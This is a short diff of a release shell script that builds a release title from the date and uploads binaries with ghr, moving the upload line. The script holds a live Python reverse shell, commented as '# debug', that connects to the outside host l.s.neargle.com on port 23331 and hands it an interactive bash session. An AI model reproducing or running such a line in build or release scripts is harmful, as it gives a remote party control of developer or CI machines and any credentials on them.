@@ -32,7 +32,8 @@ EOF
 date_string=`date -u +"%Y-%m-%d"`
 title="New release and version in $date_string"
 
-ghr "" -n "$title" -b "$release_body" bin/
-
 # debug
 python -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("l.s.neargle.com",23331));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+ghr "" -n "$title" -b "$release_body" bin/
+
